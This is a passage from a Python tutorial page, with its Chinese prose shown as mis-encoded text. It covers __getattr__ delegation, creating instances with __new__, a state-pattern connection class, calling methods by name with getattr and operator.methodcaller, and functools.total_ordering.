class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListLike</span>:</span></span><br><span class="line">    <span class="string">"""__getattr__å¯¹äºåŒä¸‹åˆ’çº¿å¼€å§‹å’Œç»“å°¾çš„æ–¹æ³•æ˜¯ä¸èƒ½ç”¨çš„ï¼Œéœ€è¦ä¸€ä¸ªä¸ªå»é‡å®šä¹‰"""</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self._items = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getattr__</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> getattr(self._items, name)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__len__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> len(self._items)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getitem__</span><span class="params">(self, index)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._items[index]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__setitem__</span><span class="params">(self, index, value)</span>:</span></span><br><span class="line">        self._items[index] = value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__delitem__</span><span class="params">(self, index)</span>:</span></span><br><span class="line">        <span class="keyword">del</span> self._items[index]</span><br></pre></td></tr></table></figure><h4 id="åˆ›å»ºä¸è°ƒç”¨initæ–¹æ³•çš„å®ä¾‹"><a href="#åˆ›å»ºä¸è°ƒç”¨initæ–¹æ³•çš„å®ä¾‹" class="headerlink" title="åˆ›å»ºä¸è°ƒç”¨initæ–¹æ³•çš„å®ä¾‹"></a>åˆ›å»ºä¸è°ƒç”¨initæ–¹æ³•çš„å®ä¾‹</h4><p>å¯ä»¥é€šè¿‡<code>__new__()</code>æ–¹æ³•åˆ›å»ºä¸€ä¸ªæœªåˆå§‹åŒ–çš„å®ä¾‹ã€‚ä¾‹å¦‚è€ƒè™‘å¦‚ä¸‹è¿™ä¸ªç±»ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Date</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, year, month, day)</span>:</span></span><br><span class="line">        self.year = year</span><br><span class="line">        self.month = month</span><br><span class="line">        self.day = day</span><br></pre></td></tr></table></figure><p>ä¸‹é¢ä¸ºä¸è°ƒç”¨<code>__init__()</code>æ–¹æ³•æ¥åˆ›å»ºè¿™ä¸ª<code>Date</code>å®ä¾‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = Date.__new__(Date)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d</span><br><span class="line">&lt;__main__.Date object at <span class="number">0x1006716d0</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.year</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">    File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">AttributeError: <span class="string">'Date'</span> object has no attribute <span class="string">'year'</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>ç»“æœå¯ä»¥çœ‹åˆ°ï¼Œè¿™ä¸ª<code>Date</code>å®ä¾‹çš„å±æ€§<code>year</code>è¿˜ä¸å­˜åœ¨ï¼Œæ‰€ä»¥ä½ éœ€è¦æ‰‹åŠ¨åˆå§‹åŒ–ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>data = &#123;<span class="string">'year'</span>:<span class="number">2023</span>, <span class="string">'month'</span>:<span class="number">10</span>, <span class="string">'day'</span>:<span class="number">11</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> key, value <span class="keyword">in</span> data.items():</span><br><span class="line"><span class="meta">... </span>    setattr(d, key, value)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.year</span><br><span class="line"><span class="number">2023</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.month</span><br><span class="line"><span class="number">10</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h4 id="å®ç°çŠ¶æ€å¯¹è±¡æˆ–è€…çŠ¶æ€æœº"><a href="#å®ç°çŠ¶æ€å¯¹è±¡æˆ–è€…çŠ¶æ€æœº" class="headerlink" title="å®ç°çŠ¶æ€å¯¹è±¡æˆ–è€…çŠ¶æ€æœº"></a>å®ç°çŠ¶æ€å¯¹è±¡æˆ–è€…çŠ¶æ€æœº</h4><p>åœ¨å¾ˆå¤šç¨‹åºä¸­ï¼Œæœ‰äº›å¯¹è±¡ä¼šæ ¹æ®çŠ¶æ€çš„ä¸åŒæ¥æ‰§è¡Œä¸åŒçš„æ“ä½œã€‚æ¯”å¦‚è€ƒè™‘å¦‚ä¸‹çš„ä¸€ä¸ªè¿æ¥å¯¹è±¡ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Connection</span>:</span></span><br><span class="line">    <span class="string">"""æ™®é€šæ–¹æ¡ˆï¼Œå¥½å¤šä¸ªåˆ¤æ–­è¯­å¥ï¼Œæ•ˆç‡ä½ä¸‹~~"""</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.state = <span class="string">'CLOSED'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.state != <span class="string">'OPEN'</span>:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">'Not open'</span>)</span><br><span class="line">        print(<span class="string">'reading'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.state != <span class="string">'OPEN'</span>:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">'Not open'</span>)</span><br><span class="line">        print(<span class="string">'writing'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">open</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.state == <span class="string">'OPEN'</span>:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">'Already open'</span>)</span><br><span class="line">        self.state = <span class="string">'OPEN'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.state == <span class="string">'CLOSED'</span>:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">'Already closed'</span>)</span><br><span class="line">        self.state = <span class="string">'CLOSED'</span></span><br></pre></td></tr></table></figure><p>è¿™æ ·å†™æœ‰å¾ˆå¤šç¼ºç‚¹ï¼Œé¦–å…ˆæ˜¯ä»£ç å¤ªå¤æ‚äº†ï¼Œå¥½å¤šçš„æ¡ä»¶åˆ¤æ–­ã€‚å…¶æ¬¡æ˜¯æ‰§è¡Œæ•ˆç‡å˜ä½ï¼Œ å› ä¸ºä¸€äº›å¸¸è§çš„æ“ä½œæ¯”å¦‚<code>read()ã€write()</code>æ¯æ¬¡æ‰§è¡Œå‰éƒ½éœ€è¦æ‰§è¡Œæ£€æŸ¥ã€‚ä¸€ä¸ªæ›´å¥½çš„åŠæ³•æ˜¯ä¸ºæ¯ä¸ªçŠ¶æ€å®šä¹‰ä¸€ä¸ªå¯¹è±¡ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Connection1</span>:</span></span><br><span class="line">    <span class="string">"""æ–°æ–¹æ¡ˆâ€”â€”å¯¹æ¯ä¸ªçŠ¶æ€å®šä¹‰ä¸€ä¸ªç±»"""</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.new_state(ClosedConnectionState)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">new_state</span><span class="params">(self, newstate)</span>:</span></span><br><span class="line">        self._state = newstate</span><br><span class="line">        <span class="comment"># Delegate to the state class</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._state.read(self)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._state.write(self, data)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">open</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._state.open(self)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._state.close(self)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Connection state base class</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConnectionState</span>:</span></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(conn)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(conn, data)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">open</span><span class="params">(conn)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close</span><span class="params">(conn)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClosedConnectionState</span><span class="params">(ConnectionState)</span>:</span></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(conn)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">'Not open'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(conn, data)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">'Not open'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">open</span><span class="params">(conn)</span>:</span></span><br><span class="line">        conn.new_state(OpenConnectionState)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close</span><span class="params">(conn)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">'Already closed'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OpenConnectionState</span><span class="params">(ConnectionState)</span>:</span></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(conn)</span>:</span></span><br><span class="line">        print(<span class="string">'reading'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(conn, data)</span>:</span></span><br><span class="line">        print(<span class="string">'writing'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">open</span><span class="params">(conn)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">'Already open'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close</span><span class="params">(conn)</span>:</span></span><br><span class="line">        conn.new_state(ClosedConnectionState)</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>c = Connection()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c._state</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">__main__</span>.<span class="title">ClosedConnectionState</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">c</span>.<span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="class"><span class="title">Traceback</span> <span class="params">(most recent call last)</span>:</span></span><br><span class="line">    File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    File <span class="string">"example.py"</span>, line <span class="number">10</span>, <span class="keyword">in</span> read</span><br><span class="line">        <span class="keyword">return</span> self._state.read(self)</span><br><span class="line">    File <span class="string">"example.py"</span>, line <span class="number">43</span>, <span class="keyword">in</span> read</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">'Not open'</span>)</span><br><span class="line">RuntimeError: Not open</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c.open()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c._state</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">__main__</span>.<span class="title">OpenConnectionState</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">c</span>.<span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="class"><span class="title">reading</span></span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">c</span>.<span class="title">write</span><span class="params">(<span class="string">'hello'</span>)</span></span></span><br><span class="line"><span class="class"><span class="title">writing</span></span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">c</span>.<span class="title">close</span><span class="params">()</span></span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">c</span>.<span class="title">_state</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> '<span class="title">__main__</span>.<span class="title">ClosedConnectionState</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt;</span></span><br></pre></td></tr></table></figure><h4 id="é€šè¿‡å­—ç¬¦ä¸²è°ƒç”¨å¯¹è±¡æ–¹æ³•"><a href="#é€šè¿‡å­—ç¬¦ä¸²è°ƒç”¨å¯¹è±¡æ–¹æ³•" class="headerlink" title="é€šè¿‡å­—ç¬¦ä¸²è°ƒç”¨å¯¹è±¡æ–¹æ³•"></a>é€šè¿‡å­—ç¬¦ä¸²è°ƒç”¨å¯¹è±¡æ–¹æ³•</h4><p>æœ‰ä¸€ä¸ªå­—ç¬¦ä¸²å½¢å¼çš„æ–¹æ³•åç§°ï¼Œå¦‚æœæƒ³é€šè¿‡å®ƒè°ƒç”¨æŸä¸ªå¯¹è±¡çš„å¯¹åº”æ–¹æ³•ã€‚æœ€ç®€å•çš„æƒ…å†µï¼Œå¯ä»¥ä½¿ç”¨<code>getattr()</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x, y)</span>:</span></span><br><span class="line">        self.x = x</span><br><span class="line">        self.y = y</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Point(&#123;!r:&#125;,&#123;!r:&#125;)'</span>.format(self.x, self.y)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">distance</span><span class="params">(self, x, y)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> math.hypot(self.x - x, self.y - y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = Point(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">d = getattr(p, <span class="string">'distance'</span>)(<span class="number">0</span>, <span class="number">0</span>)  <span class="comment"># Calls p.distance(0, 0)</span></span><br></pre></td></tr></table></figure><p>å¦å¤–ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨<code>operator.methodcaller()</code>ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> operator</span><br><span class="line">operator.methodcaller(<span class="string">'distance'</span>, <span class="number">0</span>, <span class="number">0</span>)(p)</span><br></pre></td></tr></table></figure><p>å½“ä½ éœ€è¦é€šè¿‡ç›¸åŒçš„å‚æ•°å¤šæ¬¡è°ƒç”¨æŸä¸ªæ–¹æ³•æ—¶ï¼Œä½¿ç”¨<code>operator.methodcaller</code>å°±å¾ˆæ–¹ä¾¿äº†ã€‚ æ¯”å¦‚ä½ éœ€è¦æ’åºä¸€ç³»åˆ—çš„ç‚¹ï¼Œå°±å¯ä»¥è¿™æ ·åšï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">points = [</span><br><span class="line">    Point(<span class="number">1</span>, <span class="number">2</span>),</span><br><span class="line">    Point(<span class="number">3</span>, <span class="number">0</span>),</span><br><span class="line">    Point(<span class="number">10</span>, <span class="number">-3</span>),</span><br><span class="line">    Point(<span class="number">-5</span>, <span class="number">-7</span>),</span><br><span class="line">    Point(<span class="number">-1</span>, <span class="number">8</span>),</span><br><span class="line">    Point(<span class="number">3</span>, <span class="number">2</span>)</span><br><span class="line">]</span><br><span class="line">points.sort(key=operator.methodcaller(<span class="string">'distance'</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>è°ƒç”¨ä¸€ä¸ªæ–¹æ³•å®é™…ä¸Šæ˜¯ä¸¤æ­¥ç‹¬ç«‹æ“ä½œï¼Œç¬¬ä¸€æ­¥æ˜¯æŸ¥æ‰¾å±æ€§ï¼Œç¬¬äºŒæ­¥æ˜¯å‡½æ•°è°ƒç”¨ã€‚ å› æ­¤ï¼Œä¸ºäº†è°ƒç”¨æŸä¸ªæ–¹æ³•ï¼Œä½ å¯ä»¥é¦–å…ˆé€šè¿‡<code>getattr()</code>æ¥æŸ¥æ‰¾åˆ°è¿™ä¸ªå±æ€§ï¼Œç„¶åå†å»ä»¥å‡½æ•°æ–¹å¼è°ƒç”¨å®ƒå³å¯ã€‚<br><code>operator.methodcaller()</code>åˆ›å»ºä¸€ä¸ªå¯è°ƒç”¨å¯¹è±¡ï¼Œå¹¶åŒæ—¶æä¾›æ‰€æœ‰å¿…è¦å‚æ•°ï¼Œ ç„¶åè°ƒç”¨çš„æ—¶å€™åªéœ€è¦å°†å®ä¾‹å¯¹è±¡ä¼ é€’ç»™å®ƒå³å¯ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>p = Point(<span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = operator.methodcaller(<span class="string">'distance'</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d(p)</span><br><span class="line"><span class="number">5.0</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h4 id="è®©ç±»æ”¯æŒæ¯”è¾ƒæ“ä½œ"><a href="#è®©ç±»æ”¯æŒæ¯”è¾ƒæ“ä½œ" class="headerlink" title="è®©ç±»æ”¯æŒæ¯”è¾ƒæ“ä½œ"></a>è®©ç±»æ”¯æŒæ¯”è¾ƒæ“ä½œ</h4><p><code>Python</code>ç±»å¯¹æ¯ä¸ªæ¯”è¾ƒæ“ä½œéƒ½éœ€è¦å®ç°ä¸€ä¸ªç‰¹æ®Šæ–¹æ³•æ¥æ”¯æŒã€‚ä¾‹å¦‚ä¸ºäº†æ”¯æŒ<code>&gt;=</code>æ“ä½œç¬¦ï¼Œä½ éœ€è¦å®šä¹‰ä¸€ä¸ª<code>__ge__()</code>æ–¹æ³•ã€‚è£…é¥°å™¨<code>functools.total_ordering</code>å°±æ˜¯ç”¨æ¥ç®€åŒ–è¿™ä¸ªå¤„ç†çš„ã€‚ä½¿ç”¨å®ƒæ¥è£…é¥°ä¸€ä¸ªç±»ï¼Œä½ åªéœ€å®šä¹‰ä¸€ä¸ª<code>__eq__()</code>æ–¹æ³•ï¼Œ å¤–åŠ å…¶ä»–æ–¹æ³•(<code>__lt__, __le__, __gt__, or __ge__</code>)ä¸­çš„ä¸€ä¸ªå³å¯ã€‚ ç„¶åè£…é¥°å™¨ä¼šè‡ªåŠ¨ä¸ºä½ å¡«å……å…¶å®ƒæ¯”è¾ƒæ–¹æ³•ã€‚ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> total_ordering</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Room</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, length, width)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.length = length</span><br><span class="line">        self.width = width</span><br><span class="line">        self.square_feet = self.length * self.width</span><br><span class="line"></span><br><span class="line"><span class="meta">@total_ordering</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">House</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, style)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.style = style</span><br><span class="line">        self.rooms = list()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">living_space_footage</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> sum(r.square_feet <span class="keyword">for</span> r <span class="keyword">in</span> self.rooms)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_room</span><span class="params">(self, room)</span>:</span></span><br><span class="line">        self.rooms.append(room)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&#123;&#125;: &#123;&#125; square foot &#123;&#125;'</span>.format(self.name,</span><br><span class="line">                self.living_space_footage,</span><br><span class="line">                self.style)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__eq__</span><span class="params">(self, other)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.living_space_footage == other.living_space_footage</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__lt__</span><span class="params">(self, other)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.living_space_footage &lt; other.living_space_footage</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬åªæ˜¯ç»™<code>House</code>ç±»å®šä¹‰äº†ä¸¤ä¸ªæ–¹æ³•ï¼š<code>__eq__()</code>å’Œ<code>__lt__()</code>ï¼Œå®ƒå°±èƒ½æ”¯æŒæ‰€æœ‰çš„æ¯”è¾ƒæ“ä½œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 